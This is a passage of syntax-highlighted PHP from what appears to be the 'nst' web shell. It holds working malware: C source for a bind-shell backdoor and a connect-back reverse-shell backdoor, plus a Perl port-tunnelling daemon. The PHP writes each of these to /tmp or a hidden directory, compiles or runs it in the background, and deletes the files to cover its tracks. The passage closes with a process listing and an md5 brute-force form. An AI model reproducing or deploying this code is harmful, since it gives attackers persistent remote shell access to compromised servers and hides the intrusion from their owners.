<span class="s2">        soc_cli = accept(soc_des, (struct sockaddr *) &amp;client_addr, &amp;soc_len);</span>
<span class="s2">        if (soc_cli &amp;lt; 0)</span>
<span class="s2">            exit(0);</span>
<span class="s2">        cli_pid = getpid();</span>
<span class="s2">        server_pid = fork();</span>
<span class="s2">        if (server_pid != 0) {</span>
<span class="s2">            dup2(soc_cli,0);</span>
<span class="s2">            dup2(soc_cli,1);</span>
<span class="s2">            dup2(soc_cli,2);</span>
<span class="s2">            execl(</span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">,</span><span class="se">\&quot;</span><span class="s2">sh</span><span class="se">\&quot;</span><span class="s2">,(char *)0);</span>
<span class="s2">            close(soc_cli);</span>
<span class="s2">            exit(0);</span>
<span class="s2">        }</span>
<span class="s2">    close(soc_cli);</span>
<span class="s2">    }</span>
<span class="s2">}</span>

<span class="s2">&quot;</span><span class="p">;</span>


<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bd.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$c_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc /tmp/nst_c_bd.c -o /tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup /tmp/nst_bd &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bd.c&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_c_bd.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$c_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc .nst_bd_tmp/nst_c_bd.c -o .nst_bd_tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup .nst_bd_tmp/nst_bd &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_bd&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_c_bd.c&quot;</span><span class="p">);</span>
<span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="p">}</span><span class="c1">#end of c bd</span>


<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;bc_c&#39;</span><span class="p">]){</span> <span class="c1"># nc -l -p 4500</span>
<span class="nv">$port_c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port_c&#39;</span><span class="p">];</span>
<span class="nv">$ip</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">];</span>
<span class="nv">$bc_c_scp</span> <span class="o">=</span> <span class="s2">&quot;#include &amp;lt;stdio.h&amp;gt;</span>
<span class="s2">#include &amp;lt;sys/types.h&amp;gt;</span>
<span class="s2">#include &amp;lt;sys/socket.h&amp;gt;</span>
<span class="s2">#include &amp;lt;unistd.h&amp;gt;</span>
<span class="s2">#include &amp;lt;fcntl.h&amp;gt;</span>

<span class="s2">#include &amp;lt;netinet/in.h&amp;gt;</span>
<span class="s2">#include &amp;lt;netdb.h&amp;gt;</span>

<span class="s2">int fd, sock;</span>
<span class="s2">int port = </span><span class="si">$port_c</span><span class="s2">;</span>
<span class="s2">struct sockaddr_in addr;</span>

<span class="s2">char mesg[]  = </span><span class="se">\&quot;</span><span class="s2">::Connect-Back Backdoor:: CMD: </span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="s2">char shell[] = </span><span class="se">\&quot;</span><span class="s2">/bin/sh</span><span class="se">\&quot;</span><span class="s2">;</span>

<span class="s2">int main(int argc, char *argv[]) {</span>
<span class="s2">        while(argc&amp;lt;2) {</span>
<span class="s2">        fprintf(stderr, </span><span class="se">\&quot;</span><span class="s2"> %s &amp;lt;ip&amp;gt; </span><span class="se">\&quot;</span><span class="s2">, argv[0]);</span>
<span class="s2">        exit(0); }</span>

<span class="s2">addr.sin_family = AF_INET;</span>
<span class="s2">addr.sin_port = htons(port);</span>
<span class="s2">addr.sin_addr.s_addr = inet_addr(argv[1]);</span>
<span class="s2">fd = socket(AF_INET, SOCK_STREAM, 0);</span>
<span class="s2">connect(fd, (struct sockaddr*)&amp;addr, sizeof(addr));</span>

<span class="s2">send(fd, mesg, sizeof(mesg), 0);</span>

<span class="s2">dup2(fd, 0);</span>
<span class="s2">dup2(fd, 1);</span>
<span class="s2">dup2(fd, 2);</span>
<span class="s2">execl(shell, </span><span class="se">\&quot;</span><span class="s2">in.telnetd</span><span class="se">\&quot;</span><span class="s2">, 0);</span>

<span class="s2">close(fd);</span>
<span class="s2">return 1;</span>
<span class="s2">}</span>

<span class="s2">&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">)){</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">);}</span>
<span class="k">if</span><span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">)){</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc&quot;</span><span class="p">);}</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_c_bc_c.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nv">$bd_c_scp</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;!n&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$bd_c_scp</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$bc_c_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc /tmp/nst_c_bc_c.c -o /tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup /tmp/nst_bc_c </span><span class="si">$ip</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_bc_c.c&quot;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp&quot;</span><span class="p">);</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp/nst_c_bc_c.c&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nv">$bd_c_scp</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;!n&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$bd_c_scp</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$bc_c_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;gcc .nst_bc_c_tmp/nst_c_bc_c.c -o .nst_bc_c_tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup .nst_bc_c_tmp/nst_bc_c </span><span class="si">$ip</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp/nst_bc_c.c&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp/nst_bc_c&quot;</span><span class="p">);</span>
<span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_bc_c_tmp&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>

<span class="p">}</span><span class="c1">#end of back connect C</span>


<span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;datapipe_pl&#39;</span><span class="p">]){</span>
<span class="nv">$port_2</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port_2&#39;</span><span class="p">];</span>
<span class="nv">$port_3</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port_3&#39;</span><span class="p">];</span>
<span class="nv">$ip</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">];</span>
<span class="nv">$datapipe_pl</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="s2">#!/usr/bin/perl</span>
<span class="s2"># coded by CuTTer (rus hacker)</span>
<span class="s2">use IO::Socket;</span>
<span class="s2">use POSIX;</span>

<span class="se">\$</span><span class="s2">localport=</span><span class="si">$port_2</span><span class="s2">;</span>
<span class="se">\$</span><span class="s2">host=</span><span class="se">\&quot;</span><span class="si">$ip\</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="nx">\</span><span class="nv">$port</span><span class="o">=</span><span class="nv">$port_3</span><span class="p">;</span>

<span class="nx">\</span><span class="nv">$daemon</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>

<span class="nx">\</span><span class="nv">$DIR</span> <span class="o">=</span> <span class="nx">undef</span><span class="p">;</span>


<span class="c1">###    (1-, 0-)</span>
<span class="nx">\</span><span class="nv">$log</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>




<span class="nx">\</span><span class="err">$</span><span class="o">|</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nx">\</span><span class="nv">$daemon</span><span class="p">){</span>
        <span class="k">print</span> <span class="nx">\</span><span class="s2">&quot;3anycKaeM daemon</span><span class="se">\n\&quot;</span><span class="s2">;</span>

<span class="s2">        </span><span class="se">\$</span><span class="s2">pid = fork;</span>
<span class="s2">        exit if </span><span class="se">\$</span><span class="s2">pid;</span>
<span class="s2">        die </span><span class="se">\&quot;</span><span class="s2">Couldn&#39;t fork: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2"> unless defined(</span><span class="se">\$</span><span class="s2">pid);</span>
<span class="s2">        POSIX::setsid() or die </span><span class="se">\&quot;</span><span class="s2">Can&#39;t start a new session: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="s2">}</span>

<span class="s2">%o = (&#39;port&#39; =&amp;gt; </span><span class="se">\$</span><span class="s2">localport,</span>
<span class="s2">          &#39;toport&#39; =&amp;gt; </span><span class="se">\$</span><span class="s2">port,</span>
<span class="s2">          &#39;tohost&#39; =&amp;gt; </span><span class="se">\$</span><span class="s2">host);</span>

<span class="se">\$</span><span class="s2">ah = IO::Socket::INET-&amp;gt;new(</span>
<span class="s2">                         &#39;LocalPort&#39; =&amp;gt; </span><span class="se">\$</span><span class="s2">localport,</span>
<span class="s2">                         &#39;Reuse&#39; =&amp;gt; 1,</span>
<span class="s2">                         &#39;Listen&#39; =&amp;gt; 10)</span>
<span class="s2">    || die </span><span class="se">\&quot;</span><span class="s2">    : </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2">;</span>

<span class="s2">print </span><span class="se">\&quot;</span><span class="s2">  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="se">\$</span><span class="s2">SIG{&#39;CHLD&#39;} = &#39;IGNORE&#39;;</span>
<span class="se">\$</span><span class="s2">num = 0;</span>
<span class="s2">while (1) {</span>
<span class="s2">        </span><span class="se">\$</span><span class="s2">ch = </span><span class="se">\$</span><span class="s2">ah-&amp;gt;accept();</span>
<span class="s2">        if (!</span><span class="se">\$</span><span class="s2">ch) {</span>
<span class="s2">                print STDERR </span><span class="se">\&quot;</span><span class="s2">  accept: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="s2">                next;</span>
<span class="s2">        }</span>

<span class="s2">        printf(</span><span class="se">\&quot;</span><span class="s2"> : host %s, port %s.</span><span class="se">\n\&quot;</span><span class="s2">,</span>
<span class="s2">        </span><span class="se">\$</span><span class="s2">ch-&amp;gt;peerhost(), </span><span class="se">\$</span><span class="s2">ch-&amp;gt;peerport()) if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">        ++</span><span class="se">\$</span><span class="s2">num;</span>
<span class="s2">        </span><span class="se">\$</span><span class="s2">pid = fork();</span>
<span class="s2">        if (!defined(</span><span class="se">\$</span><span class="s2">pid)) {</span>
<span class="s2">                print STDERR </span><span class="se">\&quot;</span><span class="s2">  fork: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="s2">    } elsif (</span><span class="se">\$</span><span class="s2">pid == 0) {</span>

<span class="s2">###  </span>
<span class="s2">                </span><span class="se">\$</span><span class="s2">ah-&amp;gt;close();</span>
<span class="s2">                Run(\%o, </span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">num);</span>
<span class="s2">        } else {</span>
<span class="s2">                print </span><span class="se">\&quot;</span><span class="s2">Parent: Fork  ,  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                </span><span class="se">\$</span><span class="s2">ch-&amp;gt;close();</span>
<span class="s2">        }</span>
<span class="s2">}</span>


<span class="s2">sub Run {</span>
<span class="s2">        my(</span><span class="se">\$</span><span class="s2">o, </span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">num) = @_;</span>
<span class="s2">        my </span><span class="se">\$</span><span class="s2">th = IO::Socket::INET-&amp;gt;new(&#39;PeerAddr&#39; =&amp;gt; </span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;tohost&#39;},</span>
<span class="s2">                                                        &#39;PeerPort&#39; =&amp;gt; </span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;toport&#39;});</span>
<span class="s2">        print(</span><span class="se">\&quot;</span><span class="s2">Child:    </span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;tohost&#39;},  </span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;toport&#39;}.</span><span class="se">\n\&quot;</span><span class="s2">) if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">        if (!</span><span class="se">\$</span><span class="s2">th) {</span>
<span class="s2">                printf STDERR (</span><span class="se">\&quot;</span><span class="s2">Child:    %s,  %s.</span><span class="se">\n\&quot;</span><span class="s2">,</span>
<span class="s2">                </span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;tohost&#39;}, </span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;toport&#39;});</span>
<span class="s2">                exit 0;</span>
<span class="s2">        }</span>

<span class="s2">        my </span><span class="se">\$</span><span class="s2">fh;</span>
<span class="s2">        if (</span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;dir&#39;}) {</span>
<span class="s2">                </span><span class="se">\$</span><span class="s2">fh = Symbol::gensym();</span>
<span class="s2">                open(</span><span class="se">\$</span><span class="s2">fh, </span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;dir&#39;}/tunnel</span><span class="se">\$</span><span class="s2">num.log</span><span class="se">\&quot;</span><span class="s2">)</span>
<span class="s2">                or die </span><span class="se">\&quot;</span><span class="s2">Child:     </span><span class="se">\$</span><span class="s2">o-&amp;gt;{&#39;dir&#39;}/tunnel</span><span class="se">\$</span><span class="s2">num.log: </span><span class="se">\$</span><span class="s2">!</span><span class="se">\&quot;</span><span class="s2">;</span>
<span class="s2">        }</span>

<span class="s2">        </span><span class="se">\$</span><span class="s2">ch-&amp;gt;autoflush();</span>
<span class="s2">        </span><span class="se">\$</span><span class="s2">th-&amp;gt;autoflush();</span>
<span class="s2">        while (</span><span class="se">\$</span><span class="s2">ch || </span><span class="se">\$</span><span class="s2">th) {</span>
<span class="s2">                print </span><span class="se">\&quot;</span><span class="s2">Child:  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                my </span><span class="se">\$</span><span class="s2">rin = </span><span class="se">\&quot;\&quot;</span><span class="s2">;</span>
<span class="s2">                vec(</span><span class="se">\$</span><span class="s2">rin, fileno(</span><span class="se">\$</span><span class="s2">ch), 1) = 1 if </span><span class="se">\$</span><span class="s2">ch;</span>
<span class="s2">                vec(</span><span class="se">\$</span><span class="s2">rin, fileno(</span><span class="se">\$</span><span class="s2">th), 1) = 1 if </span><span class="se">\$</span><span class="s2">th;</span>
<span class="s2">                my(</span><span class="se">\$</span><span class="s2">rout, </span><span class="se">\$</span><span class="s2">eout);</span>
<span class="s2">                select(</span><span class="se">\$</span><span class="s2">rout = </span><span class="se">\$</span><span class="s2">rin, undef, </span><span class="se">\$</span><span class="s2">eout = </span><span class="se">\$</span><span class="s2">rin, 120);</span>
<span class="s2">                if (!</span><span class="se">\$</span><span class="s2">rout  &amp;&amp;  !</span><span class="se">\$</span><span class="s2">eout) {</span>
<span class="s2">                        print STDERR </span><span class="se">\&quot;</span><span class="s2">Child:  Timeout.</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="s2">                }</span>
<span class="s2">                my </span><span class="se">\$</span><span class="s2">cbuffer = </span><span class="se">\&quot;\&quot;</span><span class="s2">;</span>
<span class="s2">                my </span><span class="se">\$</span><span class="s2">tbuffer = </span><span class="se">\&quot;\&quot;</span><span class="s2">;</span>

<span class="s2">                if (</span><span class="se">\$</span><span class="s2">ch &amp;&amp; (vec(</span><span class="se">\$</span><span class="s2">eout, fileno(</span><span class="se">\$</span><span class="s2">ch), 1) || vec(</span><span class="se">\$</span><span class="s2">rout, fileno(</span><span class="se">\$</span><span class="s2">ch), 1))) {</span>
<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child:    .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                        my </span><span class="se">\$</span><span class="s2">result = sysread(</span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">tbuffer, 1024);</span>
<span class="s2">                        if (!defined(</span><span class="se">\$</span><span class="s2">result)) {</span>
<span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child:     : </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="s2">                                exit 0;</span>
<span class="s2">                        }</span>
<span class="s2">                        if (</span><span class="se">\$</span><span class="s2">result == 0) {</span>
<span class="s2">                                print </span><span class="se">\&quot;</span><span class="s2">Child:  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                                exit 0;</span>
<span class="s2">                        }</span>

<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: : </span><span class="se">\$</span><span class="s2">cbuffer</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                }</span>

<span class="s2">                if (</span><span class="se">\$</span><span class="s2">th  &amp;&amp;  (vec(</span><span class="se">\$</span><span class="s2">eout, fileno(</span><span class="se">\$</span><span class="s2">th), 1)  || vec(</span><span class="se">\$</span><span class="s2">rout, fileno(</span><span class="se">\$</span><span class="s2">th), 1))) {</span>
<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child:  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                        my </span><span class="se">\$</span><span class="s2">result = sysread(</span><span class="se">\$</span><span class="s2">th, </span><span class="se">\$</span><span class="s2">cbuffer, 1024);</span>
<span class="s2">                        if (!defined(</span><span class="se">\$</span><span class="s2">result)) {</span>
<span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child:   : </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="s2">                                exit 0;</span>
<span class="s2">                        }</span>

<span class="s2">                        if (</span><span class="se">\$</span><span class="s2">result == 0) {</span>
<span class="s2">                                print </span><span class="se">\&quot;</span><span class="s2">Child:  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                                exit 0;</span>
<span class="s2">                        }</span>

<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child: : </span><span class="se">\$</span><span class="s2">cbuffer</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">            }</span>

<span class="s2">                if (</span><span class="se">\$</span><span class="s2">fh  &amp;&amp;  </span><span class="se">\$</span><span class="s2">tbuffer) {</span>
<span class="s2">                        (print </span><span class="se">\$</span><span class="s2">fh </span><span class="se">\$</span><span class="s2">tbuffer);</span>
<span class="s2">                }</span>

<span class="s2">                while (my </span><span class="se">\$</span><span class="s2">len = length(</span><span class="se">\$</span><span class="s2">tbuffer)) {</span>
<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child:  </span><span class="se">\$</span><span class="s2">len .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                        my </span><span class="se">\$</span><span class="s2">res = syswrite(</span><span class="se">\$</span><span class="s2">th, </span><span class="se">\$</span><span class="s2">tbuffer, </span><span class="se">\$</span><span class="s2">len);</span>
<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child:  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                        if (</span><span class="se">\$</span><span class="s2">res &amp;gt; 0) {</span>
<span class="s2">                                </span><span class="se">\$</span><span class="s2">tbuffer = substr(</span><span class="se">\$</span><span class="s2">tbuffer, </span><span class="se">\$</span><span class="s2">res);</span>
<span class="s2">                        } else {</span>
<span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child:   : </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="s2">                        }</span>
<span class="s2">                }</span>

<span class="s2">                while (my </span><span class="se">\$</span><span class="s2">len = length(</span><span class="se">\$</span><span class="s2">cbuffer)) {</span>
<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child:  </span><span class="se">\$</span><span class="s2">len  .</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                        my </span><span class="se">\$</span><span class="s2">res = syswrite(</span><span class="se">\$</span><span class="s2">ch, </span><span class="se">\$</span><span class="s2">cbuffer, </span><span class="se">\$</span><span class="s2">len);</span>
<span class="s2">                        print </span><span class="se">\&quot;</span><span class="s2">Child:  ..</span><span class="se">\n\&quot;</span><span class="s2"> if </span><span class="se">\$</span><span class="s2">log;</span>
<span class="s2">                        if (</span><span class="se">\$</span><span class="s2">res &amp;gt; 0) {</span>
<span class="s2">                                </span><span class="se">\$</span><span class="s2">cbuffer = substr(</span><span class="se">\$</span><span class="s2">cbuffer, </span><span class="se">\$</span><span class="s2">res);</span>
<span class="s2">                        } else {</span>
<span class="s2">                                print STDERR </span><span class="se">\&quot;</span><span class="s2">Child:   : </span><span class="se">\$</span><span class="s2">!</span><span class="se">\n\&quot;</span><span class="s2">;</span>
<span class="s2">                        }</span>
<span class="s2">                }</span>
<span class="s2">        }</span>
<span class="s2">}</span>

<span class="s2">&quot;</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_datapipe.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$datapipe_pl</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl /tmp/nst_perl_datapipe.pl &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_datapipe.pl&quot;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp&quot;</span><span class="p">);</span>
<span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp/nst_perl_datapipe.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$datapipe_pl</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl .nst_datapipe_tmp/nst_perl_datapipe.pl &amp;&quot;</span><span class="p">);</span>
<span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp/nst_perl_datapipe.pl&quot;</span><span class="p">);</span>
<span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_datapipe_tmp&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>

<span class="p">}</span><span class="c1">#end of datapipe perl</span>





<span class="k">if</span><span class="p">(</span><span class="nv">$show_ps</span><span class="o">==</span><span class="s2">&quot;1&quot;</span><span class="p">){</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;1&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;ps ux&quot;</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
<span class="p">}</span>



<span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=post&amp;gt;&amp;lt;b&amp;gt;md5:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input name=md5 size=30&amp;gt;</span>
<span class="s2">&amp;lt;Br&amp;gt;</span>
<span class="s2">md5 online encoder/decoder (brutforce) (php) - [&amp;lt;a href=http://nst.void.ru/?q=releases&amp;download=4&amp;gt;DOWNLOAD&amp;lt;/a&amp;gt;]</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&quot;</span><span class="p">;</span>
<span class="o">@</span><span class="nv">$md5</span><span class="o">=@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">];</span>
